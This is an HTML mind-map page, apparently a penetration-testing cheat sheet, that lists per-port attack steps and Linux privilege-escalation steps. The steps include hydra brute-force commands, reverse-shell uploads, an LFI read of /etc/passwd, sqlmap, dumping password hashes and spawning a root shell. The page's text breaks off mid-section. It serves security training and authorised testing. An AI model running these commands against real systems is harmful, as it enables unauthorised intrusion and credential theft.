<!doctype html>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="ie=edge" />
<title>Markmap</title>
<style>
* {
  margin: 0;
  padding: 0;
}
html {
  font-family: ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji',
    'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
}
#mindmap {
  display: block;
  width: 100vw;
  height: 100vh;
}
.markmap-dark {
  background: #27272a;
  color: white;
}
</style>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/markmap-toolbar@0.18.12/dist/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.18/dist/katex.min.css">
</head>
<body>
<svg id="mindmap"></svg>
<script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js"></script><script src="https://cdn.jsdelivr.net/npm/markmap-view@0.18.12/dist/browser/index.js"></script><script src="https://cdn.jsdelivr.net/npm/markmap-toolbar@0.18.12/dist/index.js"></script><script>(e=>{window.WebFontConfig={custom:{families:["KaTeX_AMS","KaTeX_Caligraphic:n4,n7","KaTeX_Fraktur:n4,n7","KaTeX_Main:n4,n7,i4,i7","KaTeX_Math:i4,i7","KaTeX_Script","KaTeX_SansSerif:n4,n7,i4","KaTeX_Size1","KaTeX_Size2","KaTeX_Size3","KaTeX_Size4","KaTeX_Typewriter"]},active:()=>{e().refreshHook.call()}}})(()=>window.markmap)</script><script src="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.js" defer></script><script>(()=>{setTimeout(()=>{const{markmap:S,mm:Q}=window,$=new S.Toolbar;$.attach(Q);const I=$.render();I.setAttribute("style","position:absolute;bottom:20px;right:20px"),document.body.append(I)})})()</script><script>((l,U,M,R)=>{const N=l();window.mm=N.Markmap.create("svg#mindmap",(U||N.deriveOptions)(R),M),window.matchMedia("(prefers-color-scheme: dark)").matches&&document.documentElement.classList.add("markmap-dark")})(()=>window.markmap,null,{"content":"Interactive Pentest Workflow","children":[{"content":"Workflow by Port","children":[{"content":"Port&#x202f;21&#xa0;&#x2013; FTP Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 21 -sV --script ftp-anon,ftp-bounce &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"15,16"}},{"content":"Scan the target for an FTP service, capture its version, and test basic vulnerabilities.","children":[],"payload":{"tag":"li","lines":"16,17"}},{"content":"Banner (e.g., <em>vsftpd&#x202f;2.3.4</em>) plus output from <code>ftp-anon</code> / <code>ftp-bounce</code> showing anonymous&#x2011;login status or bounce capability.","children":[],"payload":{"tag":"li","lines":"17,18"}},{"content":"Based on the output, decide the next step in the workflow&#x2014;e.g., attempt login with discovered credentials, enumerate additional services, or escalate privileges.","children":[],"payload":{"tag":"li","lines":"18,20"}}],"payload":{"tag":"h3","lines":"14,15"}},{"content":"Output&#x202f;Possibilities","children":[{"content":"Anonymous login allowed","children":[],"payload":{"tag":"li","lines":"21,22"}},{"content":"FTP version detected (e.g., vsftpd&#x202f;2.3.4)","children":[],"payload":{"tag":"li","lines":"22,23"}},{"content":"Login required","children":[],"payload":{"tag":"li","lines":"23,24"}},{"content":"No response","children":[],"payload":{"tag":"li","lines":"24,25"}}],"payload":{"tag":"h3","lines":"20,21"}},{"content":"Step&#x202f;1: Anonymous Login","children":[{"content":"\n<p data-lines=\"28,29\"><code>ftp &lt;target&gt;</code></p>","children":[],"payload":{"tag":"li","lines":"28,29"}},{"content":"\n<p data-lines=\"29,30\">Establish an FTP session to enumerate files and test read/write permissions.</p>","children":[],"payload":{"tag":"li","lines":"29,30"}},{"content":"\n<p data-lines=\"30,31\">Observe the output for success or errors.</p>","children":[],"payload":{"tag":"li","lines":"30,31"}},{"content":"\n<p data-lines=\"31,32\">Next: enumerate further, upload payloads, or pivot.</p>","children":[],"payload":{"tag":"li","lines":"31,33"}},{"content":"\n<p data-lines=\"33,34\">If allowed:</p>","children":[{"content":"<code>ls</code>","children":[],"payload":{"tag":"li","lines":"34,35"}},{"content":"<code>get &lt;file&gt;</code>","children":[],"payload":{"tag":"li","lines":"35,36"}},{"content":"<code>put &lt;payload&gt;</code>","children":[],"payload":{"tag":"li","lines":"36,37"}},{"content":"Review results and plan follow&#x2011;up actions.","children":[],"payload":{"tag":"li","lines":"37,39"}}],"payload":{"tag":"li","lines":"33,39"}}],"payload":{"tag":"h3","lines":"27,28"}},{"content":"Step&#x202f;2: Brute&#x2011;Force Credentials","children":[{"content":"<code>hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"40,41"}},{"content":"Perform an online brute&#x2011;force attack to discover valid credentials.","children":[],"payload":{"tag":"li","lines":"41,42"}},{"content":"Hydra highlights valid password(s).","children":[],"payload":{"tag":"li","lines":"42,43"}},{"content":"Replay creds, enumerate deeper, or upload web shells.","children":[],"payload":{"tag":"li","lines":"43,45"}}],"payload":{"tag":"h3","lines":"39,40"}},{"content":"Step&#x202f;3: Version&#x2011;Based Exploits","children":[{"content":"<code>searchsploit vsftpd 2.3.4</code>","children":[],"payload":{"tag":"li","lines":"46,47"}},{"content":"Locate a PoC exploit that matches the detected version.","children":[],"payload":{"tag":"li","lines":"47,48"}},{"content":"PoC copied / compiled.","children":[],"payload":{"tag":"li","lines":"48,49"}},{"content":"Run exploit, catch shell with <code>nc &lt;target&gt; 6200</code>.","children":[],"payload":{"tag":"li","lines":"49,51"}}],"payload":{"tag":"h3","lines":"45,46"}}],"payload":{"tag":"h2","lines":"12,13"}},{"content":"Port&#x202f;22&#xa0;&#x2013; SSH Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 22 -sV --script ssh2-enum-algos,ssh-hostkey &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"56,57"}},{"content":"Scan for an SSH service, enumerate key/cipher info, and test for weak algorithms.","children":[],"payload":{"tag":"li","lines":"57,58"}},{"content":"Service banner, supported ciphers, and host&#x2011;key fingerprint.","children":[],"payload":{"tag":"li","lines":"58,59"}},{"content":"Decide: brute&#x2011;force credentials, test key reuse, or exploit old OpenSSH.","children":[],"payload":{"tag":"li","lines":"59,61"}}],"payload":{"tag":"h3","lines":"55,56"}},{"content":"Step&#x202f;1: Credential Brute&#x2011;Force","children":[{"content":"<code>hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"62,63"}},{"content":"Discover weak passwords via online attack.","children":[],"payload":{"tag":"li","lines":"63,64"}},{"content":"Hydra lists any successful login.","children":[],"payload":{"tag":"li","lines":"64,65"}},{"content":"SSH in and proceed to privilege escalation.","children":[],"payload":{"tag":"li","lines":"65,67"}}],"payload":{"tag":"h3","lines":"61,62"}},{"content":"Step&#x202f;2: Key&#x2011;Based Access","children":[{"content":"<code>ssh -i id_rsa user@&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"68,69"}},{"content":"Attempt auth with any harvested private keys.","children":[],"payload":{"tag":"li","lines":"69,70"}},{"content":"Successful key login opens interactive shell.","children":[],"payload":{"tag":"li","lines":"70,71"}},{"content":"Enumerate for sudo rights or local exploits.","children":[],"payload":{"tag":"li","lines":"71,73"}}],"payload":{"tag":"h3","lines":"67,68"}},{"content":"Step&#x202f;3: Exploit Old/OpenSSH","children":[{"content":"<code>searchsploit openssh &lt;version&gt;</code>","children":[],"payload":{"tag":"li","lines":"74,75"}},{"content":"Find and run version&#x2011;specific exploits.","children":[],"payload":{"tag":"li","lines":"75,76"}},{"content":"Expect a reverse or elevated shell.","children":[],"payload":{"tag":"li","lines":"76,77"}},{"content":"Move to post&#x2011;exploitation.","children":[],"payload":{"tag":"li","lines":"77,79"}}],"payload":{"tag":"h3","lines":"73,74"}}],"payload":{"tag":"h2","lines":"53,54"}},{"content":"Port&#x202f;53&#xa0;&#x2013; DNS Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 53 -sU -sV --script dns-recursion,dns-service-discovery &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"84,85"}},{"content":"Identify DNS service, recursion status, and enumerate records.","children":[],"payload":{"tag":"li","lines":"85,86"}},{"content":"Output shows recursion allowed, version, or zone&#x2011;transfer hints.","children":[],"payload":{"tag":"li","lines":"86,87"}},{"content":"If recursion/AXFR open &#x2192; dump zone; else brute&#x2011;force sub&#x2011;domains.","children":[],"payload":{"tag":"li","lines":"87,89"}}],"payload":{"tag":"h3","lines":"83,84"}},{"content":"Step&#x202f;1: Zone Transfer","children":[{"content":"<code>dig axfr @&lt;target&gt; domain.com</code>","children":[],"payload":{"tag":"li","lines":"90,91"}},{"content":"Request full DNS zone.","children":[],"payload":{"tag":"li","lines":"91,92"}},{"content":"If AXFR succeeds, hostnames &amp; sub&#x2011;domains appear.","children":[],"payload":{"tag":"li","lines":"92,93"}},{"content":"Feed new hosts into Nmap quick scans.","children":[],"payload":{"tag":"li","lines":"93,95"}}],"payload":{"tag":"h3","lines":"89,90"}},{"content":"Step&#x202f;2: Brute&#x2011;Force Sub&#x2011;domains","children":[{"content":"<code>dnsenum domain.com</code> / <code>fierce -dns domain.com</code>","children":[],"payload":{"tag":"li","lines":"96,97"}},{"content":"Enumerate hidden sub&#x2011;domains.","children":[],"payload":{"tag":"li","lines":"97,98"}},{"content":"Tool outputs a list of candidates.","children":[],"payload":{"tag":"li","lines":"98,99"}},{"content":"Add to <code>/etc/hosts</code>; probe each for web/mail services.","children":[],"payload":{"tag":"li","lines":"99,101"}}],"payload":{"tag":"h3","lines":"95,96"}}],"payload":{"tag":"h2","lines":"81,82"}},{"content":"Port&#x202f;80/443&#xa0;&#x2013; HTTP(S) Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 80,443 -sV --script http-title,http-enum,http-methods &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"106,107"}},{"content":"Detect web services, enumerate titles, paths, and allowed methods.","children":[],"payload":{"tag":"li","lines":"107,108"}},{"content":"Service banner, HTTP title, and method list.","children":[],"payload":{"tag":"li","lines":"108,109"}},{"content":"Plan fingerprinting (<code>whatweb</code>), directory brute&#x2011;force, or vuln testing.","children":[],"payload":{"tag":"li","lines":"109,111"}}],"payload":{"tag":"h3","lines":"105,106"}},{"content":"Step&#x202f;1: Service Fingerprinting","children":[{"content":"\n<p data-lines=\"112,113\"><code>whatweb http://&lt;target&gt;</code></p>","children":[],"payload":{"tag":"li","lines":"112,113"}},{"content":"\n<p data-lines=\"113,114\">Identify frameworks, CMS, and server software.</p>","children":[],"payload":{"tag":"li","lines":"113,114"}},{"content":"\n<p data-lines=\"114,115\">Tool lists plugins/themes, versions.</p>","children":[],"payload":{"tag":"li","lines":"114,115"}},{"content":"\n<p data-lines=\"115,116\">Map to CVEs or default creds.</p>","children":[],"payload":{"tag":"li","lines":"115,117"}},{"content":"\n<p data-lines=\"117,118\"><code>curl -I http://&lt;target&gt;</code></p>","children":[],"payload":{"tag":"li","lines":"117,118"}},{"content":"\n<p data-lines=\"118,119\">Retrieve HTTP headers for cookies and version info.</p>","children":[],"payload":{"tag":"li","lines":"118,119"}},{"content":"\n<p data-lines=\"119,120\">Headers reveal technologies or redirects.</p>","children":[],"payload":{"tag":"li","lines":"119,120"}},{"content":"\n<p data-lines=\"120,121\">Feed into vulnerability assessment.</p>","children":[],"payload":{"tag":"li","lines":"120,122"}}],"payload":{"tag":"h3","lines":"111,112"}},{"content":"Step&#x202f;2: Directory&#x202f;/&#x202f;File Enumeration","children":[{"content":"<code>gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt</code>","children":[],"payload":{"tag":"li","lines":"123,124"}},{"content":"Find hidden directories &amp; files.","children":[],"payload":{"tag":"li","lines":"124,125"}},{"content":"Gobuster prints 200/301 URLs.","children":[],"payload":{"tag":"li","lines":"125,126"}},{"content":"Investigate <code>/admin</code>, <code>/backup.zip</code>, etc.","children":[],"payload":{"tag":"li","lines":"126,128"}}],"payload":{"tag":"h3","lines":"122,123"}},{"content":"Step&#x202f;3: Common Vulnerabilities","children":[{"content":"<strong>File Upload</strong> &#x2013; try uploading <code>php&#x2011;reverse&#x2011;shell.php</code>; intercept with Burp.","children":[],"payload":{"tag":"li","lines":"129,130"}},{"content":"<strong>LFI</strong> &#x2013; <code>http://&lt;target&gt;/?page=../../../../etc/passwd</code> test.","children":[],"payload":{"tag":"li","lines":"130,131"}},{"content":"<strong>SQLi</strong> &#x2013; <code>sqlmap -u &quot;http://&lt;target&gt;/index.php?id=1&quot; --batch</code> automatic test.","children":[],"payload":{"tag":"li","lines":"131,133"}}],"payload":{"tag":"h3","lines":"128,129"}}],"payload":{"tag":"h2","lines":"103,104"}},{"content":"Port&#x202f;111&#xa0;&#x2013; RPCBind","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 111 --script rpcinfo &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"138,139"}},{"content":"Identify RPC programs and versions.","children":[],"payload":{"tag":"li","lines":"139,140"}},{"content":"List of program numbers and ports.","children":[],"payload":{"tag":"li","lines":"140,141"}},{"content":"Use <code>rpcinfo</code> / <code>showmount -e</code> for deeper checks.","children":[],"payload":{"tag":"li","lines":"141,143"}}],"payload":{"tag":"h3","lines":"137,138"}}],"payload":{"tag":"h2","lines":"135,136"}},{"content":"Port&#x202f;135&#xa0;&#x2013; MS&#x202f;RPC","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 135 --script msrpc-enum &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"148,149"}},{"content":"Enumerate MS&#x2011;RPC endpoints.","children":[],"payload":{"tag":"li","lines":"149,150"}},{"content":"Endpoint mapping table.","children":[],"payload":{"tag":"li","lines":"150,151"}},{"content":"Probe with <code>rpcclient -U &quot;&quot; &lt;target&gt;</code> for shares/users.","children":[],"payload":{"tag":"li","lines":"151,153"}}],"payload":{"tag":"h3","lines":"147,148"}}],"payload":{"tag":"h2","lines":"145,146"}},{"content":"Port&#x202f;143&#xa0;&#x2013; IMAP","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 143 -sV &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"158,159"}},{"content":"Detect IMAP service &amp; banner.","children":[],"payload":{"tag":"li","lines":"159,160"}},{"content":"Service banner reveals software/version.","children":[],"payload":{"tag":"li","lines":"160,161"}},{"content":"Attempt brute&#x2011;force with Hydra if creds unknown.","children":[],"payload":{"tag":"li","lines":"161,163"}}],"payload":{"tag":"h3","lines":"157,158"}}],"payload":{"tag":"h2","lines":"155,156"}},{"content":"Port&#x202f;161&#xa0;&#x2013; SNMP Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -sU -p 161 --script snmp-info &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"168,169"}},{"content":"Detect SNMP and pull system information.","children":[],"payload":{"tag":"li","lines":"169,170"}},{"content":"SNMP&#x2011;info script prints sysDescr, location, contact.","children":[],"payload":{"tag":"li","lines":"170,171"}},{"content":"If &#x201c;public&#x201d; community open &#x2192; enumerate more via <code>snmpwalk</code>.","children":[],"payload":{"tag":"li","lines":"171,173"}}],"payload":{"tag":"h3","lines":"167,168"}},{"content":"Step&#x202f;1: Community String Check","children":[{"content":"\n<p data-lines=\"174,175\"><code>snmpwalk -v2c -c public &lt;target&gt;</code></p>","children":[],"payload":{"tag":"li","lines":"174,175"}},{"content":"\n<p data-lines=\"175,176\">Dump full SNMP tree.</p>","children":[],"payload":{"tag":"li","lines":"175,176"}},{"content":"\n<p data-lines=\"176,177\">Output includes users, processes, NICs.</p>","children":[],"payload":{"tag":"li","lines":"176,177"}},{"content":"\n<p data-lines=\"177,178\">Mine data for usernames or network layout.</p>","children":[],"payload":{"tag":"li","lines":"177,179"}},{"content":"\n<p data-lines=\"179,180\"><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt &lt;target&gt;</code></p>","children":[],"payload":{"tag":"li","lines":"179,180"}},{"content":"\n<p data-lines=\"180,181\">Brute common community strings.</p>","children":[],"payload":{"tag":"li","lines":"180,181"}},{"content":"\n<p data-lines=\"181,182\">Onesix&#xad;tyone prints any valid string found.</p>","children":[],"payload":{"tag":"li","lines":"181,182"}},{"content":"\n<p data-lines=\"182,183\">Use valid strings for further <code>snmpwalk</code>.</p>","children":[],"payload":{"tag":"li","lines":"182,184"}}],"payload":{"tag":"h3","lines":"173,174"}},{"content":"Step&#x202f;2: Data Extraction","children":[{"content":"Gather usernames, routing tables, ARP caches.","children":[],"payload":{"tag":"li","lines":"185,186"}},{"content":"Leverage for lateral movement or password spraying.","children":[],"payload":{"tag":"li","lines":"186,188"}}],"payload":{"tag":"h3","lines":"184,185"}}],"payload":{"tag":"h2","lines":"165,166"}},{"content":"Port&#x202f;389&#xa0;&#x2013; LDAP Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 389 --script ldap-search &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"193,194"}},{"content":"Detect LDAP, test anonymous bind, and sample directory entries.","children":[],"payload":{"tag":"li","lines":"194,195"}},{"content":"ldap&#x2011;search script returns base&#x202f;DN and sample objects.","children":[],"payload":{"tag":"li","lines":"195,196"}},{"content":"Attempt full anonymous dump or password spray.","children":[],"payload":{"tag":"li","lines":"196,198"}}],"payload":{"tag":"h3","lines":"192,193"}},{"content":"Step&#x202f;1: Anonymous LDAP Dump","children":[{"content":"<code>ldapsearch -x -H ldap://&lt;target&gt; -b &quot;dc=example,dc=com&quot;</code>","children":[],"payload":{"tag":"li","lines":"199,200"}},{"content":"Try unauthenticated directory query.","children":[],"payload":{"tag":"li","lines":"200,201"}},{"content":"If entries appear, usernames &amp; groups harvested.","children":[],"payload":{"tag":"li","lines":"201,202"}},{"content":"Build user list for SMB&#x202f;/&#x202f;Kerberos spraying.","children":[],"payload":{"tag":"li","lines":"202,204"}}],"payload":{"tag":"h3","lines":"198,199"}},{"content":"Step&#x202f;2: Extract Usernames","children":[{"content":"<code>ldapsearch -x -H ldap://&lt;target&gt; -b &quot;dc=example,dc=com&quot; | grep sAMAccountName | cut -d&quot; &quot; -f2 &gt; users.txt</code>","children":[],"payload":{"tag":"li","lines":"205,206"}},{"content":"Generate a clean user list.","children":[],"payload":{"tag":"li","lines":"206,207"}},{"content":"<code>users.txt</code> populated.","children":[],"payload":{"tag":"li","lines":"207,208"}},{"content":"Feed list into Hydra / CrackMapExec.","children":[],"payload":{"tag":"li","lines":"208,210"}}],"payload":{"tag":"h3","lines":"204,205"}},{"content":"Step&#x202f;3: Search Admin Groups","children":[{"content":"<code>ldapsearch -x -H ldap://&lt;target&gt; -b &quot;dc=example,dc=com&quot; &quot;(objectClass=group)&quot; | grep -i admin</code>","children":[],"payload":{"tag":"li","lines":"211,212"}},{"content":"Identify privileged groups.","children":[],"payload":{"tag":"li","lines":"212,213"}},{"content":"Output highlights Domain&#x202f;Admins, etc.","children":[],"payload":{"tag":"li","lines":"213,214"}},{"content":"Target accounts in those groups for further attacks.","children":[],"payload":{"tag":"li","lines":"214,216"}}],"payload":{"tag":"h3","lines":"210,211"}},{"content":"Step&#x202f;4: Advanced Attribute Discovery","children":[{"content":"<code>ldapsearch -x -H ldap://&lt;target&gt; -b &quot;dc=example,dc=com&quot; &quot;(objectClass=person)&quot; displayName mail description</code>","children":[],"payload":{"tag":"li","lines":"217,218"}},{"content":"Dump descriptions, emails.","children":[],"payload":{"tag":"li","lines":"218,219"}},{"content":"Descriptions may hold passwords or server hints.","children":[],"payload":{"tag":"li","lines":"219,220"}},{"content":"Use gleaned info for social&#x2011;engineering or pivoting.","children":[],"payload":{"tag":"li","lines":"220,222"}}],"payload":{"tag":"h3","lines":"216,217"}}],"payload":{"tag":"h2","lines":"190,191"}},{"content":"Port&#x202f;3306&#xa0;&#x2013; MySQL Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 3306 --script mysql-info &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"227,228"}},{"content":"Detect MySQL service &amp; version.","children":[],"payload":{"tag":"li","lines":"228,229"}},{"content":"mysql&#x2011;info script returns banner, status, SSL.","children":[],"payload":{"tag":"li","lines":"229,230"}},{"content":"Attempt default creds or brute&#x2011;force.","children":[],"payload":{"tag":"li","lines":"230,232"}}],"payload":{"tag":"h3","lines":"226,227"}},{"content":"Step&#x202f;1: Default Logins","children":[{"content":"<code>mysql -u root -h &lt;target&gt; -p</code>","children":[],"payload":{"tag":"li","lines":"233,234"}},{"content":"Try common usernames (root, admin).","children":[],"payload":{"tag":"li","lines":"234,235"}},{"content":"Prompt indicates success/failure.","children":[],"payload":{"tag":"li","lines":"235,236"}},{"content":"If access gained &#x2192; enumerate databases.","children":[],"payload":{"tag":"li","lines":"236,238"}}],"payload":{"tag":"h3","lines":"232,233"}},{"content":"Step&#x202f;2: Brute&#x2011;Force","children":[{"content":"<code>hydra -L users.txt -P rockyou.txt mysql://&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"239,240"}},{"content":"Online brute&#x2011;force for MySQL creds.","children":[],"payload":{"tag":"li","lines":"240,241"}},{"content":"Hydra reports valid login.","children":[],"payload":{"tag":"li","lines":"241,242"}},{"content":"Dump tables, look for password hashes.","children":[],"payload":{"tag":"li","lines":"242,244"}}],"payload":{"tag":"h3","lines":"238,239"}},{"content":"Step&#x202f;3: Exploit Access","children":[{"content":"<code>select user, password from mysql.user;</code>","children":[],"payload":{"tag":"li","lines":"245,246"}},{"content":"Retrieve hashed passwords.","children":[],"payload":{"tag":"li","lines":"246,247"}},{"content":"Hashes captured.","children":[],"payload":{"tag":"li","lines":"247,248"}},{"content":"Crack offline or load UDF for privilege escalation.","children":[],"payload":{"tag":"li","lines":"248,250"}}],"payload":{"tag":"h3","lines":"244,245"}}],"payload":{"tag":"h2","lines":"224,225"}},{"content":"Port&#x202f;3389&#xa0;&#x2013; RDP Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 3389 --script rdp-enum-encryption &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"255,256"}},{"content":"Detect RDP service &amp; encryption type.","children":[],"payload":{"tag":"li","lines":"256,257"}},{"content":"Script shows CredSSP/encryption levels.","children":[],"payload":{"tag":"li","lines":"257,258"}},{"content":"If NLA disabled &#x2192; attempt brute&#x2011;force.","children":[],"payload":{"tag":"li","lines":"258,260"}}],"payload":{"tag":"h3","lines":"254,255"}},{"content":"Step&#x202f;1: Brute&#x2011;Force","children":[{"content":"<code>hydra -t 4 -V -f -l user -P rockyou.txt rdp://&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"261,262"}},{"content":"Test credentials quickly.","children":[],"payload":{"tag":"li","lines":"262,263"}},{"content":"Hydra flags success.","children":[],"payload":{"tag":"li","lines":"263,264"}},{"content":"Connect with <code>xfreerdp /u:user /p:pass /v:&lt;target&gt;</code>.","children":[],"payload":{"tag":"li","lines":"264,266"}}],"payload":{"tag":"h3","lines":"260,261"}}],"payload":{"tag":"h2","lines":"252,253"}},{"content":"Port&#x202f;5985&#xa0;&#x2013; WinRM Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 5985 -sV &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"271,272"}},{"content":"Detect WinRM service and auth methods.","children":[],"payload":{"tag":"li","lines":"272,273"}},{"content":"Banner reveals Windows build + auth types.","children":[],"payload":{"tag":"li","lines":"273,274"}},{"content":"If Basic/NTLM open &#x2192; brute&#x2011;force.","children":[],"payload":{"tag":"li","lines":"274,276"}}],"payload":{"tag":"h3","lines":"270,271"}},{"content":"Step&#x202f;1: WinRM Access","children":[{"content":"<code>evil-winrm -i &lt;target&gt; -u user -p password</code>","children":[],"payload":{"tag":"li","lines":"277,278"}},{"content":"Gain a PowerShell session.","children":[],"payload":{"tag":"li","lines":"278,279"}},{"content":"Evil&#x2011;WinRM prompt appears.","children":[],"payload":{"tag":"li","lines":"279,280"}},{"content":"Dump creds, run scripts, escalate.","children":[],"payload":{"tag":"li","lines":"280,282"}}],"payload":{"tag":"h3","lines":"276,277"}}],"payload":{"tag":"h2","lines":"268,269"}},{"content":"Port&#x202f;6379&#xa0;&#x2013; Redis","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 6379 --script redis-info &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"287,288"}},{"content":"Detect Redis instance &amp; info.","children":[],"payload":{"tag":"li","lines":"288,289"}},{"content":"redis&#x2011;info outputs version, role, keys.","children":[],"payload":{"tag":"li","lines":"289,290"}},{"content":"Attempt unauthenticated redis&#x2011;cli access.","children":[],"payload":{"tag":"li","lines":"290,292"}}],"payload":{"tag":"h3","lines":"286,287"}}],"payload":{"tag":"h2","lines":"284,285"}},{"content":"Ports&#x202f;8000/8080/8443&#xa0;&#x2013; Alt&#xa0;HTTP","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 8000,8080,8443 -sV --script http-title,http-methods &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"297,298"}},{"content":"Detect alternate web services &amp; methods.","children":[],"payload":{"tag":"li","lines":"298,299"}},{"content":"Titles/methods listed.","children":[],"payload":{"tag":"li","lines":"299,300"}},{"content":"Repeat web enumeration steps (WhatWeb, Gobuster).","children":[],"payload":{"tag":"li","lines":"300,302"}}],"payload":{"tag":"h3","lines":"296,297"}}],"payload":{"tag":"h2","lines":"294,295"}},{"content":"Port&#x202f;9200&#xa0;&#x2013; Elasticsearch","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 9200 --script http-title,http-elasticsearch-info &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"307,308"}},{"content":"Detect open Elasticsearch node &amp; indices.","children":[],"payload":{"tag":"li","lines":"308,309"}},{"content":"Script lists cluster name, version, indices.","children":[],"payload":{"tag":"li","lines":"309,310"}},{"content":"Dump data with <code>curl http://&lt;target&gt;:9200/_cat/indices?v</code>.","children":[],"payload":{"tag":"li","lines":"310,312"}}],"payload":{"tag":"h3","lines":"306,307"}}],"payload":{"tag":"h2","lines":"304,305"}},{"content":"Port&#x202f;11211&#xa0;&#x2013; Memcached","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 11211 --script memcached-info &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"317,318"}},{"content":"Detect Memcached and stats.","children":[],"payload":{"tag":"li","lines":"318,319"}},{"content":"Script shows uptime, items, hit rate.","children":[],"payload":{"tag":"li","lines":"319,320"}},{"content":"Test unauthenticated <code>memcached-tool</code> commands.","children":[],"payload":{"tag":"li","lines":"320,322"}}],"payload":{"tag":"h3","lines":"316,317"}}],"payload":{"tag":"h2","lines":"314,315"}},{"content":"Port&#x202f;27017&#xa0;&#x2013; MongoDB","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 27017 --script mongodb-databases,mongodb-info &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"327,328"}},{"content":"Detect MongoDB &amp; list databases if no auth.","children":[],"payload":{"tag":"li","lines":"328,329"}},{"content":"Script returns db names and storage stats.","children":[],"payload":{"tag":"li","lines":"329,330"}},{"content":"Connect with <code>mongo &lt;target&gt;:27017</code> for manual queries.","children":[],"payload":{"tag":"li","lines":"330,332"}}],"payload":{"tag":"h3","lines":"326,327"}}],"payload":{"tag":"h2","lines":"324,325"}},{"content":"Port&#x202f;139/445&#xa0;&#x2013; SMB Workflow","children":[{"content":"Nmap&#x202f;Detection","children":[{"content":"<code>nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"337,338"}},{"content":"Detect SMB shares, users, and OS info.","children":[],"payload":{"tag":"li","lines":"338,339"}},{"content":"Script prints share list, NetBIOS, and OS version.","children":[],"payload":{"tag":"li","lines":"339,340"}},{"content":"Use <code>enum4linux</code> / <code>smbclient</code> for deeper enumeration.","children":[],"payload":{"tag":"li","lines":"340,342"}}],"payload":{"tag":"h3","lines":"336,337"}}],"payload":{"tag":"h2","lines":"334,335"}}],"payload":{"tag":"h1","lines":"10,11"}},{"content":"Privilege Escalation Flow","children":[{"content":"Linux","children":[{"content":"1 &#x2014; Baseline identity and context","children":[{"content":"<code>whoami &amp;&amp; id &amp;&amp; hostname</code>","children":[],"payload":{"tag":"li","lines":"349,350"}},{"content":"Identify the current user, groups, and system hostname.","children":[],"payload":{"tag":"li","lines":"350,351"}},{"content":"Output should reveal an unprivileged account (e.g., www&#x2011;data) and any interesting group memberships.","children":[],"payload":{"tag":"li","lines":"351,352"}},{"content":"If already root, skip escalation. Otherwise, record unusual groups such as docker or lxd for later use.","children":[],"payload":{"tag":"li","lines":"352,354"}}],"payload":{"tag":"h3","lines":"348,349"}},{"content":"2 &#x2014; Check sudo rights","children":[{"content":"<code>sudo -l</code>","children":[],"payload":{"tag":"li","lines":"355,356"}},{"content":"List commands the current user may run via sudo.","children":[],"payload":{"tag":"li","lines":"356,357"}},{"content":"Expect either a &apos;may run&apos; table or a &apos;not allowed&apos; message.","children":[],"payload":{"tag":"li","lines":"357,358"}},{"content":"If NOPASSWD on any command, run it directly; if ALL, spawn a root shell with <code>sudo -s</code>.","children":[],"payload":{"tag":"li","lines":"358,360"}}],"payload":{"tag":"h3","lines":"354,355"}},{"content":"3 &#x2014; Kernel and OS 